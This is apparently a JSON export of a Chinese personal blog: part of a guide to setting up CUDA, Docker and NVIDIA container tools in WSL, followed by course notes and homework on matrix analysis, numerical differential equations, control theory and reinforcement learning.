upgrade 自动升级. 在手动升级 CUDA 版本, 或者清除以其他方式安装的 CUDA 版本时, 建议先移除所有 CUDA 相关的包 1sudo apt-get remove --purge '^cuda.*' 'nvidia-.*' 'libnvidia-.*' 注意在 WSL 中只需安装 CUDA Toolkit, 不需要安装 NVIDIA 驱动. 在一般 Debian 裸机上还需安装 NVIDIA 驱动.1sudo apt-get install -y nvidia-open安装最新稳定版本的 NVIDIA 驱动. 目前看来高版本的驱动没那么可怕, 建议不要守着 535 版本不放. 毕竟 LLM 横行的时代, 高版本的 CUDA Toolkit 和 PyTorch 都有很多重要的新特性.另外，如果使用数据中心级的 GPU (A100, H100, …)，还要安装1sudo apt-get install -y datacenter-gpu-manager nvidia-fabricmanager否则可能出现 nvidia-smi 正常但 PyTorch 报错 system not yet initialized 的问题。 安装完成后应当能在 WSL 中运行 nvidia-smi 命令，显示显卡的状态。 Step 6 - 在 WSL 中安装 Docker 不要使用 Docker Desktop，它有太多的 Bug。我们直接在 WSL 中安装 Docker。 https://docs.docker.com/engine/install/ubuntu/https://docs.docker.com/engine/install/ubuntu/ 粘到 WSL 里运行（已加入代理设置）： 123456789101112131415# Add Docker's official GPG key:sudo apt-get updatesudo apt-get install ca-certificates curlsudo install -m 0755 -d /etc/apt/keyringssudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc --proxy http://$(hostname).local:7890sudo chmod a+r /etc/apt/keyrings/docker.asc# Add the repository to Apt sources:echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \\ $(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\") stable\" | \\ sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/nullsudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin 说明也可以考虑使用国内 Docker APT 镜像源, 例如北外镜像. 仍然需要按照上面五行命令从 Docker 官网获得 GPG 密钥。1234echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://mirrors.bfsu.edu.cn/docker-ce/linux/debian \\ \"$(. /etc/os-release &amp;&amp; echo \"$VERSION_CODENAME\")\" stable\" | \\ tee /etc/apt/sources.list.d/docker.list &gt; /dev/null 随后在 Docker Daemon 的 Systemd 单元文件中配置代理环境变量 1234567sudo mkdir -p /etc/systemd/system/docker.service.decho '[Service]' | sudo tee /etc/systemd/system/docker.service.d/http-proxy.confecho \"Environment=\\\"HTTP_PROXY=http://$(hostname).local:7890\\\"\" | sudo tee -a /etc/systemd/system/docker.service.d/http-proxy.confecho \"Environment=\\\"HTTPS_PROXY=http://$(hostname).local:7890\\\"\" | sudo tee -a /etc/systemd/system/docker.service.d/http-proxy.confecho \"Environment=\\\"NO_PROXY=localhost,127.0.0.1\\\"\" | sudo tee -a /etc/systemd/system/docker.service.d/http-proxy.confsudo systemctl daemon-reloadsudo systemctl restart docker 把当前用户加入 docker 组，以免每次用 docker 都要 sudo： 1sudo usermod -aG docker $USER 别用 Rootless Docker, 纯属自找麻烦。 需要重启 shell。创建 Docker Client 的配置文件并设置代理，这样容器中会自动添加代理的环境变量： 12mkdir -p ~/.dockerecho \"{\\\"proxies\\\":{\\\"default\\\":{\\\"httpProxy\\\":\\\"http://$(hostname):7890\\\",\\\"httpsProxy\\\":\\\"http://$(hostname):7890\\\",\\\"noproxy\\\":\\\"localhost,127.0.0.1,::1\\\"}}}\" &gt; ~/.docker/config.json 这里不加 .local, 不正确的 noproxy 可能导致 gradio 无法启动。 正确完成本节后，应当能在 WSL 中运行 docker run hello-world 命令，显示 Docker 正常工作。 配置好 Docker Client 的代理设置后，可以直接在容器中运行 curl 命令，访问互联网。 Step 7 - 安装 NVIDIA Container Toolkit 在 WSL 中可以直接安装 Ubuntu 版本的 NVIDIA Container Toolkit。 https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html#installing-on-ubuntu-and-debianhttps://docs.nvidia.com/datacenter/cloud-native/container-toolkit/install-guide.html#installing-on-ubuntu-and-debian 12345678curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \\ &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list | \\ sed 's#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g' | \\ sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.listsudo apt-get updatesudo apt-get install -y nvidia-container-toolkitsudo nvidia-ctk runtime configure --runtime=dockersudo systemctl restart docker 下载一个带 CUDA 的 PyTorch 镜像试试： 1docker pull pytorch/pytorch:2.3.1-cuda12.1-cudnn8-devel 注: 使用 Docker 时，可以使用任意的比系统 CUDA 版本低的 CUDA 镜像。开发时请使用 devel 版本的 PyTorch 镜像，只有 devel 版本才包含编译器，可以编译 C++ 扩展。 PyTorch devel 镜像现在已有 8 个多 G docker pull 并不能断点续传，最好用一个好的代理。 成功安装 NVIDIA Container Toolkit 后，能在容器内运行 nvidia-smi 命令，显示显卡的状态。 1docker run --rm -it --gpus all pytorch/pytorch:2.3.1-cuda12.1-cudnn8-devel nvidia-smi Docker 快速入门 一个 Docker 镜像包含了运行程序所需的完整文件系统和环境变量。Docker 容器是一个特殊的进程，使用 Docker 镜像提供的文件系统和环境变量，并且网络栈和主机一般是隔离的（实际上，几乎所有的用户态要素都被隔离了）。相比于虚拟机，Docker 能快速地启动和停止，而且 Docker 镜像的大小通常比虚拟机的小很多。 需要注意的是，Docker 容器被设计成无状态的，容器内的文件系统和环境变量都是临时的，任何修改都会在容器停止后丢失。如果需要向容器内安装新的程序或者修改配置文件，应该重新构建一个新的 Docker 镜像。如果需要保存容器内的数据，应该把数据文件挂载（Mount）到宿主机的文件夹或者 Docker Volume。Docker Commit 命令可以把运行中的容器保存为新的 Docker 镜像，但是不推荐用来制作镜像，只适合用于调试或者紧急保存数据的需求。 可以方便地从 Docker Hub 上下载包含各类 Linux 发行版和软件的镜像，由于 Docker 提供了充分的隔离，几乎所有镜像都能下载后开箱即用，省去了手动安装各类环境的麻烦。如果需要自定义镜像，可以使用 Dockerfile 来描述镜像的构建过程，然后使用 docker build 命令构建镜像。Dockerfile 中的每一条指令都会生成一个新的镜像层，Docker 会尽量复用已有的镜像层，以减少镜像的大小。Dockerfile 通常包括 FROM, RUN, COPY, CMD 等指令。 FROM 指定基础镜像 RUN 在镜像中运行 Shell 命令，可以用来安装软件 COPY 复制文件到镜像中。由于 Docker 的设计，要复制的文件必须在构建上下文中，所以通常需要把文件放在 Dockerfile 同一目录下 CMD 指定容器启动时默认运行的命令 ENV 设置环境变量 Docker 镜像的构建过程会被缓存，如果 Dockerfile 的某一步发生了变化，Docker 会重新构建这一步之后的所有步骤。下面是一个常见的 Dockerfile 示例： 1234567891011121314151617181920# 有了 Docker，可以使用任意老版本的 PyTorch 和 CUDA，而不会影响其他的项目FROM pytorch/pytorch:1.7.1-cuda11.0-cudnn8-devel# Dockerfile 中 APT 包的安装比较复杂，建议复制下面的格式# rm /etc/apt/sources.list.d/cuda.list 如果镜像中没有 CUDA，则删掉这一行# 如果不指定 DEBIAN_FRONTEND=noninteractive TZ=Asia/Shanghai 和 -y 参数，构建镜像会因为 apt 等待用户输入而卡死RUN rm /etc/apt/sources.list.d/cuda.list \\ &amp;&amp; sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list \\ &amp;&amp; sed -i 's/security.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list \\ &amp;&amp; apt-get update \\ &amp;&amp; DEBIAN_FRONTEND=noninteractive TZ=Asia/Shanghai apt-get install -y git gdb vim curl wget tmux zip cmake ffmpeg libsm6 libxext6 \\ &amp;&amp; rm -rf /var/lib/apt/lists/*# environment.yml 需要放在 Dockerfile 同一目录下COPY environment.yml /tmp/environment.ymlRUN conda env create -f /tmp/environment.ymlRUN conda init bash# 除了 Conda，也可以直接用 pip 安装 Python 包，Docker 已经提供了环境隔离RUN pip install -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com h5py einops tqdm matplotlib tensorboard torch-tb-profiler ninja scipy 可以用 docker build 命令构建 Docker 镜像： 1docker build -t my-image-name . -t 参数指定镜像的名字，只能包含小写字母和数字，可以用 / 分隔，. 指定 Dockerfile 所在的目录。构建完成后可以用 docker images 命令查看所有的镜像。 要启动 Docker 镜像，可以使用 docker run 命令： 1docker run --rm -it --gpus all -v $(pwd):/workspace -p 8080:80 my-image-name bash --rm 容器停止后自动删除，一般不用留着因为数据都清除了 -it 交互式启动，可以使用 Shell。如果需要作为后台进程运行，换成 -d 参数 --gpus all 允许容器使用所有的 GPU，不加用不了 CUDA -v $(pwd):/workspace 把当前目录挂载到容器的 /workspace 目录，可以在容器内的 /workspace 目录中读写文件，数据会随时同步到宿主机，不会丢失 -p 8080:80 把容器的 80 端口映射到宿主机的 8080 端口，可以通过 localhost:8080 访问容器内 80 端口的 Web 服务。如果不需要映射端口，可以不加这个参数。 在 WSL2 上，这个命令只负责从容器映射到 WSL2 的网络栈 但通常 WSL2 上的端口能被自动映射到 Windows 上，可以直接在 Windows 上访问 localhost:8080 my-image-name 指定要启动的镜像名称 bash 指定容器启动时运行的命令，可不加，默认是 CMD 指定的命令 使用 docker ps 命令可以查看所有正在运行的容器，使用 docker stop 命令可以停止容器（容器会在主进程退出后自动停止）。使用 docker exec 命令可以在运行中的容器中运行命令。使用 docker cp 命令可以从容器中复制文件到宿主机。具体用法略。 Docker Compose 可以用来管理多个容器，也能方便的把容器的启动参数写到文件里。具体用法略。 DevContainer 指北 Visual Studio Code 的 DevContainer 功能可以让你在容器中开发代码，能自动启动容器并使用 VS Code 在容器内进行开发调试。DevContainer 会自动挂载当前目录到容器内的 /workspace 目录，所以容器内的文件会和宿主机同步，不会丢失。VS Code 还能自动配置端口映射和 X11 显示并兼容 WSLg，plt.show() 能在 Windows 上显示图像。 要使用 DevContainer，需要安装 Visual Studio Code、Remote - WSL 和 Remote - Containers 插件。由于我们没有使用 Docker Desktop，所以需要先让 VSCode 连接到 WSL，才能使用 DevContainer 功能。 首次配置大致需要以下几个步骤： 打开 VS Code，按左下角的 &gt;&lt; 图标，选择 Remote-WSL: New Window 在 Terminal 窗口中 git clone 你的项目，或者打开一个已有的项目, 项目目录最好放在 WSL 的文件系统中 (如 /home/username/project), 然后 cd 到项目目录, 用 code . 命令打开项目 添加 DevContainer 配置文件 .devcontainer/devcontainer.json 和 .devcontainer/Dockerfile. Dockerfile 可以参考上一节的例子，DevContainer 配置文件可以参考下面的例子 按左下角的 &gt;&lt; 图标，选择 Remote-Containers: Reopen in Container，VS Code 会自动构建镜像并启动容器，首次启动可能需要下载镜像和安装软件包，耗时较长。如果构建失败，可以在 VS Code 的 Terminal 窗口中查看构建日志。很多构建失败的原因是网络问题，请确保你已经按照上面的步骤在所有地方都设置好了代理。 在容器中可以使用 VS Code 的所有功能，包括调试、代码补全、代码格式化等。容器内的文件会和宿主机同步，不会丢失。容器内的代码修改会立即反映到宿主机，不需要手动同步文件。 下面是 .devcontainer/devcontainer.json 模板，需要按需修改挂载数据集的配置（如果需要） 123456789101112131415161718192021222324252627282930313233343536{ \"build\": { \"dockerfile\": \"Dockerfile\", }, \"customizations\": { \"vscode\": { \"extensions\": [ \"ms-python.python\", \"ms-python.autopep8\", \"ms-vscode.cmake-tools\", \"ms-vscode.cpptools\", \"GitHub.copilot\", \"ms-vscode.hexeditor\", // Add more extensions here to use in the container ], }, }, \"capAdd\": [ \"SYS_PTRACE\", // Required to use gdb ], \"runArgs\": [ // Enable host.docker.internal DNS name \"--add-host=host.docker.internal:host-gateway\", // Enable CUDA support \"--gpus\", \"all\", ], \"mounts\": [ // UNCOMMENT AND TYPE YOUR ABSOLUTE PATH TO THE DATASETS FOLDER // \"type=bind,source=/absolute/path/to/datasets,target=/datasets\" ], \"shutdownAction\": \"none\", \"hostRequirements\": { \"gpu\": true, },}","tags":["炼丹","指北","docker","网络"],"categories":["技术"]},{"title":"矩阵分析速通","path":"/2024/6/10/Matrix/","content":"第一章 - 线性空间 线性空间八条性质 线性空间的子空间 线性空间的基、坐标 维数公式 直和 线性变换，特征值，特征向量 相似矩阵： 存在可逆矩阵 使得 Jordan 标准形：对任意 存在可逆矩阵 使得 ，其中 为 Jordan 标准形 酉空间 酉空间，内积四条性质：正定，共轭对称，齐次，可加 列空间垂直 正交补的存在性、唯一性 投影变换： 线性变换 使得 , 又称为幂等变换 正交投影： , 满足 是正交投影 初等矩阵 特征谱 时可逆 Householder 矩阵 (初等酉阵) 是镜像变换，, 是关于垂直于 的超平面的镜像变换 酉变换、酉矩阵是正交变换、正交矩阵在复数域的推广 酉矩阵的特征值模长为 酉矩阵的乘积是酉矩阵 Kronecker 积 单位矩阵之间的 Kronecker 积是单位矩阵 标量积、对加法分配律、结合律 转置，共轭 混合积 前行后列展开定义证明 逆 迹、秩 行列式 用 Jordan 标准型和混合积证明 保持转置、Hermite、酉矩阵 乘积的乘方 特征值 对应的特征向量做 Kronecker 积 Kronecker 和 的特征值是 和 的特征值之和，对应的特征向量是 和 的特征向量的 Kronecker 积 向量化算子 (Flatten in Fortran order), 第二章 - 范数 向量范数 向量范数定义：正定性、齐次性、三角不等式 常用向量范数 1-范数：各分量模长之和 2-范数：模长 -范数：最大分量模长 Cauchy 不等式 非负 , , Holder 不等式 Holder 范数 矩阵 列满秩，则 是 上的向量范数 任意向量范数 关于 连续 定理 任意向量范数等价， 定理 向量序列收敛等价于范数收敛 矩阵范数 从向量范数推广的矩阵范数 正定性、齐次性、三角不等式 1-范数 , 2-范数 , -范数 等价性 相容性 对矩阵乘法保持三角关系 自相容 和 相容，展开矩阵乘用三角不等式、Cauchy 不等式证明 不相容，修正为 是相容的 Frobenius 范数 酉矩阵 不改变 Frobenius 范数 算子范数 矩阵范数与向量范数的相容性 显然 与 相容， 与 相容， 与 相容 算子范数 对于任意向量范数构造与之相容的矩阵范数 算子范数是与向量范数相容的矩阵范数中最小的 算子范数是自相容的矩阵范数 定理 对于相容的矩阵范数存在向量范数 与矩阵范数相容 定理 相容的矩阵范数不小于特征值 极大列和范数 从属于 的算子范数 极大行和范数 从属于 的算子范数 谱半径 谱范数 从属于 的算子范数 转置、Hermite、共轭不改变谱范数 酉矩阵不改变谱范数 常用矩阵范数的等价性 广义算子范数 矩阵范数的相容性 第三章 - 矩阵分解 三角分解 行满秩、列满秩 行单位向量正交阵 , 列单位向量正交阵 上三角阵、单位上三角阵、下三角阵、单位下三角阵 三角阵、酉矩阵具有逆运算、乘积运算的结构不变性 UR 分解 满秩复矩阵 可唯一分解成酉矩阵 和正线上三角复矩阵 或正线下三角复矩阵 的乘积 UR 分解可对 的列向量做 Gram-Schmidt 正交化 的列向量是 的元素 QR 分解 满秩实矩阵 可唯一分解成正交矩阵 和正线上三角实矩阵 或正线下三角实矩阵 的乘积 实对称正定矩阵 可唯一分解成正线上三角实矩阵 正定 Hermite 矩阵 可唯一分解成正线上三角复矩阵 LDR 分解 以下条件等价 主子式非零 可唯一分解成 可唯一分解成 可唯一分解成 非方阵的 UR 分解 非满秩的分解 谱分解 代数重数：特征值 在特征多项式中出现的次数 几何重数：特征值 对应的特征空间 几何重数小于等于代数重数 单纯矩阵 所有特征值的代数重数等于几何重数 相似对角化 单纯矩阵可相似对角化 单纯矩阵可分解成一系列幂等矩阵 的加权和 满足 幂等性 分离性 可加性 定理 复方阵 是单纯矩阵 可分解成满足上述性质的 个幂等矩阵的加权和， 是不同特征值的数量 正规矩阵 与正规矩阵酉相似的矩阵是正规矩阵 Schur 分解 , 是上三角矩阵， 是酉矩阵 是三角矩阵， 是正规矩阵 是对角矩阵 是正规矩阵 可分解成 ，其中 是酉矩阵， 是对角矩阵 是正规矩阵 可分解成 个矩阵的加权和 Hermitian 矩阵 Hermitian 矩阵 特征值都是实数 属于不同特征值的特征向量正交 可分解成 ，其中 是酉矩阵， 是对角矩阵 正惯性指数 是正特征值的个数，负惯性指数 是负特征值的个数 其中 是可逆矩阵 正定 Hermitian 矩阵 对角线元素大于零 特征值大于零 顺序主子式大于零 存在正定矩阵 使得 Cholesky 分解 存在正线下三角矩阵 Hadamard 不等式 存在可逆矩阵 使得 其中 是对角矩阵，或者 最大秩分解 通过行初等变换求最大秩分解 奇异值分解 和 特征值均为非负实数且相同 的特征值 是 的奇异值的平方 酉等价 的矩阵有相同的正奇异值 有 个正奇异值，存在酉矩阵 使得 其中 是 个正奇异值的对角矩阵. 求 SVD 的方法 求 的特征值 和特征向量组成 求 的特征向量组成 是 组成的对角矩阵 存在酉矩阵和半正定 Hermite 矩阵 满秩时分解是唯一的 第四章 - 特征值 Schur 不等式 特征值与 F 范数的关系，设 的特征值为 ，则 当且仅当正规矩阵时取等 Hirsch 定理 特征值实部虚部的上界 Bendixson 定理 特征值虚部的上界 记 的特征值为 , 的特征值为 Browne 定理 奇异值 满足 Hadamard 不等式 的列向量 ， 当且仅当 某一列为零或列向量彼此正交时取等 圆盘定理 行盖尔圆盘 列盖尔圆盘 定理 的特征值 在行盖尔圆盘 内 定理 个圆盘构成的联通区域（不与其他 个圆盘相交）包含 个特征值 关于列盖尔圆盘的推论 关于行列对角占优的推论 Hermite 矩阵特征值的变分特征 Rayleigh 商 Hermite 矩阵 分解为 , , , , , Rayleigh-Ritz 定理 Courant-Fischer 定理 为给定正整数 Weyl 定理 为 Hermite 矩阵 关于和的特征值的放缩 第五章 - 矩阵函数 矩阵序列极限 收敛矩阵 Neumann 级数 常用级数 矩阵函数的求法：Jordan 分解 第六章 - 广义逆 列满秩 左可逆 行满秩 右可逆 初等变换求左逆 初等变换求右逆 广义逆 的广义逆 满足 广义逆保持转置、Hermite 和 幂等且 自反广义逆 自反广义逆 Moore-Penrose 广义逆 最大秩分解求 MP 广义逆 SVD 求 MP 广义逆 线性方程组 有解， 是最小范数解，通解 无解， 是最佳逼近解，最小二乘解通解 MP 广义逆性质 1 MP 广义逆性质 2","tags":["矩阵","线性代数","数学"],"categories":["课程"]},{"title":"微分方程数值解作业 6","path":"/2024/5/25/DE-6/","content":"Problem 1 Question (a) The equation to solve is Use a rectangular grid and the central difference scheme for first and second order derivatives where is the truncation error. Dropping the error term and rearranging the equation, we have where and . Consider the boundary conditions described as The boundary conditions can be written as FDEs at the top row (where ) transform to Let then the equation can be written as where . The above equation can be written in matrix form where and is a matrix. has the following structure where is a tridiagonal matrix and and are diagonal matrices is a vector It is easy to see that and can be reduced to those in (6.20) when . Question (b) With , and To use the conjugate gradient method, must be symmetric and positive definite. The symmetric property is obvious in this case. Then we use Test 1 in 6.2.2 to derive a necessary condition for to be positive definite. The condition is And derive a sufficient condition for using Test 3. . , covered by the first condition. The first row of satifies when the first condition is satisfied. is irreducible, since the directed graph of is equivalent to the grid graph, which is connected. The test suggests that is a sufficient condition for to be positive definite. Using the same test, we can discover that is a sufficient condition for to be positive definite, which also allows the use of the conjugate gradient method. Question (c) The symmetric condition requires , and then with , the matrix falls back to that in (6.20), which is proved to be positive definite. Therefore the necessary and sufficient condition to use the conjugate gradient method is . Question (d) Combining the results from (b) and (c), we can find a sufficient condition for the utilization of the conjugate gradient method is Problem 2 Question (a) Equation (6.17) for and . Use centered difference at to handle the bottom boundary condition The FDEs for are With the boundary condition , the above equation can be simplified to Let we can express the above FDE system as where is the vectorized form of . has the following structure is a tridiagonal matrix is a vector It is obvious that is not symmetric. Question (b) Use second ordered forward difference at to handle the bottom boundary condition and (6.17) at becomes That is With we express the above FDE system as where is the vectorized form of . has the following structure where is a tridiagonal matrix It is clear that is not symmetric. Problem 3 Question (a) 12345678910111213\\begin{tikzpicture}[darkstyle/.style={circle,draw,fill=gray!40,minimum size=20}] \\foreach \\x in {0,...,2} \\foreach \\y in {0,...,2} { \\pgfmathtruncatemacro{\\label}{\\x - 3 * \\y + 7} ode [darkstyle] (\\x\\y) at (1.5*\\x,1.5*\\y) {$P_{\\label}$}; } \\foreach \\x in {0,...,2} \\foreach \\y [count=\\yi] in {0,1} { \\draw[&lt;-&gt;] (\\x\\y)--(\\x\\yi); \\draw[&lt;-&gt;] (\\y\\x)--(\\yi\\x); }\\end{tikzpicture} It is easy to see that the directed graph of forms a grid graph. The grid graph is connected, so the matrix is irreducible. Question (b) The Gershgorin-Taussky theorem states that the eigenvalues of a real symmetric matrix lies in the union of intervals For the given matrix , Therefore Problem 4 Question (a) From equation (6.15) we can derive with Substracting the above equation with Equation (6.17) and use the definition of error , we have The above equation has the same coefficient matrix as Equation (6.17). Same simplification can be applied to the boundary conditions, where the left side of the equaiton has the same coefficient matrix, and the constants on the right side are discarded, leaving only . Therefore the error FDE system can be expressed with the same matrix as in (6.21), and the system is Question (b) is symmetric and positive definite is invertible. From the Cauchy-Schwarz inequality, we have The Schur inequality states that That is Therefore Question (c) From Section 6.2.2 we know Therefore That indicates that the error is bounded by the truncation error.","tags":["微分方程"],"categories":["课程"]},{"title":"矩阵函数在线性时不变系统的能控性和能观性上的应用","path":"/2024/5/20/Mat/","content":"引言 控制理论诞生于上个世纪，基于信息的交互来控制目标的运动，经典的控制理论已经广泛用于工业自动化、认知科学、人工智能和经济学等多个领域。现代控制理论基于状态空间描述的状态方程模型，基于矩阵作用于状态向量来表示系统，通过矩阵函数简化了对系统稳定性的判断和控制器的设计，也便于计算机求解。本文将简要介绍状态空间方程的定义，以及如何根据矩阵函数的运算性质来分析线性时不变系统的能控性和能观性。 线性时不变系统 首先定义系统的状态变量 是 维向量， 维输出向量完全由初始状态 和 维控制向量 在 内的历史决定，则状态方程可以由有限个一阶常微分方程组描述： 线性系统可以进一步的写成如下形式 其中 是 矩阵， 是 矩阵， 是 矩阵， 是 矩阵。进一步地，线性时不变系统可以写作 非线性系统可以通过 Jacobian 矩阵在平衡点附近线性化，然后用线性系统的方法来分析。当 满秩时，系统的自治平衡点具有唯一解。 考虑最简单的线性自治系统 的解可以借助一个 的转移矩阵 来表示 通过不动点迭代求解常微分方程的初值问题，按照如下的公式 带入 ，可以得到 可以看到， 是 的幂次多项式， 可以用矩阵的指数函数来表示 转移函数具有指数函数的性质。对于普通的线性时不变系统 代入解的形式 并应用指数函数的求导法则，可以得到 化简得到 使用不动点迭代得到 再应用转移函数的定义得到任意时刻的状态变量解 前一项 是系统的齐次解，后一项 是系统的特解。代入输出变量的定义中，得到输出变量的解 输出变量可分解成自治的运动、受控的运动和直接控制三个部分的线性叠加。 能控性 能控性是指系统是否可以在有限时间内，从任意初始状态经由一个连续的控制输入到达任意状态。对于线性时不变系统，可以通过控制矩阵 和状态矩阵 来判断系统的能控性。在状态变量的解中，取 并 ，则 其中 是控制输入的 阶矩。上式表明目标终值 可以看作 等的线性组合。那么目标终值 能覆盖整个状态空间的充要条件是 等的线性组合能够覆盖整个状态空间。而由 Caylay 定理指出，矩阵的特征多项式 满足 也就是说 都能用 线性表示。因此，系统的能控性可以通过判断 的控制矩阵的秩来判断。如果 则系统是能控的。此为 Kalman 可控性条件。 能观性 能观性是指系统是否可以通过有限时间内通过连续的控制变量以及测得的输出变量的信息，完全地确定初始状态 。对于线性时不变系统，可以通过观测矩阵 和状态矩阵 来判断系统的能观性。考虑输出变量的解 注意到后两项与初始条件 无关，为了简化问题，再令 ，则输出变量的解简化为 假设存在非零向量 使得 则 这意味着 的初值 不唯一，要么为 ，要么为 。这要求不能存在这样的 ，即能观矩阵满秩 则系统是能观的。此为 Kalman 可观性条件。 结论 本文简要介绍了线性时不变系统的状态空间方程，以及如何通过矩阵函数的运算性质来分析系统的能控性和能观性。能控性和能观性是线性时不变系统的两个重要性质，能控性保证系统可以在有限时间内从任意初始状态到达任意状态，能观性保证系统可以通过有限时间内通过连续的控制变量以及测得的输出变量的信息，完全地确定初始状态。这两个性质是系统稳定性和控制器设计的基础，对于控制理论的研究和应用具有重要意义。","tags":["矩阵分析","线性系统","控制理论"],"categories":["课程"]},{"title":"微分方程数值解作业 5","path":"/2024/5/12/DE-5/","content":"Problem 1 Question Dispersion Relation Phase Velocity Group Velocity Dispersive Dissipative (a) Yes No (b) Yes Yes (c) Yes No Question (a) With the plane wave solution we have That simplifies to which holds for all if and only if and this is the dispersion relation. The phase velocity The group velocity The equation is dispersive since depends on . The equation is nondissipative since requires to be zero. Question (b) With the plane wave solution, we have That simplifies to Therefore the dispersion relation is Since are all real, is real. The phase velocity The phase velocity The group velocity It can be shown that Also, which is true since is positive. The equation is dispersive since depends on . It is also disspative because in , is not necessarily real. Question (c) With the plane wave solution, we have which simplifies to The dispersion relation is The phase velocity The group velocity The equation is dispersive since depends on . It is also nondissipative since is zero. Problem 2 Question (a) Question (b) From (5.31) we have With the initial condition in we have That is All desired can be solved by the tridiagonal matrix equation And then compute using , and so on. Question (c) The method satisfies CFL condition, since the system described by requires depends on all of , so the numerical domain of dependence is the entire domain. As shown in previous chapters, an unnecessarily large domain of dependence can lead to less accurate results. Using other approximations in space can not lift the need to solve the tridiagonal matrix equation. Question (d) From (5.31) we have With the initial condition in we have Therefore can be determined explicitly by The stencil for is , which is a 3-point stencil. 12345678910111213141516\\begin{tikzpicture}\\draw[gray, thick] (-2,0) -- (2,0);\\draw[gray, thick] (-2,-1) -- (2,-1);\\draw[gray, thick] (-1,-1.5) -- (-1,0.5);\\draw[gray, thick] (0,-1.5) -- (0,0.5);\\draw[gray, thick] (1,-1.5) -- (1,0.5);\\draw (-2.5,0) node {$t_{1}$};\\draw (-2.5,-1) node {$t_{0}$};\\draw (-1,-2) node {$x_{i-1}$};\\draw (0,-2) node {$x_i$};\\draw (1,-2) node {$x_{i+1}$};\\draw[red] (0,0) circle [radius=0.15];\\filldraw[red] (-1,-1) circle [radius=0.15];\\filldraw[red] (0,-1) circle [radius=0.15];\\filldraw[red] (1,-1) circle [radius=0.15];\\end{tikzpicture} The CFL condition is the same as in the textbook. Problem 3 Question (a) Use a uniform grid where and Evaluate the difference equation at Using centered differences to approximate the derivatives we have This can be rearranged to where is the truncation error. Drop the error term to get the finite difference approximation for and . The first boundary condition in (5.2) can be approximated by The second boundary condition in (5.3) can be handled by introducing ghost points at , described in . With we can calculate for The stencil for this method is 12345678910111213141516171819\\begin{tikzpicture}\\draw[gray, thick] (-2,1) -- (2,1);\\draw[gray, thick] (-2,0) -- (2,0);\\draw[gray, thick] (-2,-1) -- (2,-1);\\draw[gray, thick] (-1,-1.5) -- (-1,1.5);\\draw[gray, thick] (0,-1.5) -- (0,1.5);\\draw[gray, thick] (1,-1.5) -- (1,1.5);\\draw (-2.5,1) node {$t_{j+1}$};\\draw (-2.5,0) node {$t_j$};\\draw (-2.5,-1) node {$t_{j-1}$};\\draw (-1,-2) node {$x_{i-1}$};\\draw (0,-2) node {$x_i$};\\draw (1,-2) node {$x_{i+1}$};\\draw[red] (0,1) circle [radius=0.15];\\filldraw[red] (1,0) circle [radius=0.15];\\filldraw[red] (0,-1) circle [radius=0.15];\\filldraw[red] (0,0) circle [radius=0.15];\\filldraw[red] (-1,0) circle [radius=0.15];\\end{tikzpicture} and 12345678910111213141516\\begin{tikzpicture}\\draw[gray, thick] (-2,0) -- (2,0);\\draw[gray, thick] (-2,-1) -- (2,-1);\\draw[gray, thick] (-1,-1.5) -- (-1,0.5);\\draw[gray, thick] (0,-1.5) -- (0,0.5);\\draw[gray, thick] (1,-1.5) -- (1,0.5);\\draw (-2.5,0) node {$t_{1}$};\\draw (-2.5,-1) node {$t_{0}$};\\draw (-1,-2) node {$x_{i-1}$};\\draw (0,-2) node {$x_i$};\\draw (1,-2) node {$x_{i+1}$};\\draw[red] (0,0) circle [radius=0.15];\\filldraw[red] (-1,-1) circle [radius=0.15];\\filldraw[red] (0,-1) circle [radius=0.15];\\filldraw[red] (1,-1) circle [radius=0.15];\\end{tikzpicture} at the first time step The numerical domain of dependence consists of the points The CFL condition is satisfied when Question (b) Assuming we can substitute this into to obtain The amplification factor is From some numerical experiments we can find that the magnitude of the amplification factor is less than 1 for all positive . The method is always stable. Question (c) First we investigate the dispersion relation of the damped wave equation Substituting the plane wave solution, we have and the dispersion relation is The phase velocity is and depends on . Therefore the damped wave equation is dispersive. is not zero, so the equation is dissipative. Then we investigate the dispersion relation of the finite difference method. The numerical plane wave solution is Substituting this into we have It will be difficult to solve , but it can be shown that always depends on and has a non-zero imaginary part. Therefore the finite difference method is dispersive and dissipative, matching the properties of the damped wave equation. Problem 4 Question (a) With the wave equation we have . Therefore is a constant. Question (b) The discrete energy is and the approximation of the wave equation is From the boundry condition we have , so . Therefore is a constant.","tags":["微分方程"],"categories":["课程"]},{"title":"强化学习作业 7","path":"/2024/5/4/RL-7/","content":"Problem 1 表示在策略 下从任意状态出发根据策略进行一步动作后的期望回报，与具体的 等无关。 表示在策略下从任意状态触发走 步的期望回报，由于 与 无关，所以求和只是将 个相同的期望回报相加，结果是 个相同的期望回报的和。 表示在 时刻，采用 策略从任意状态出发根据策略进行一步动作后的期望回报，与策略 和在这个策略下 时 的分布有关。在本问题中取值是 Problem 2 后向 TD(λ) 里的资格迹累积并衰减某个状态 的出现次数，从而刻画过去出现的状态和现在的结果之间的关联程度。后向 GAE 中的资格迹也是通过将无穷级数求和展开成迭代的形式推导出来的，但是累加并衰减的对象不只是状态的出现次数。课件的 17 页将资格迹定义为 的累加，然后资格迹 用来给优势函数 加权，也就是说后向 GAE 中的资格迹刻画了过去的现在的优势函数和过去的优势函数的关联程度，要求现在的策略梯度与过去的优势函数有关。 后向 TD(λ) 通过资格迹来利用现在的信息更新“过去”的状态价值。后向 GAE 里资格迹没有直接的像 TD 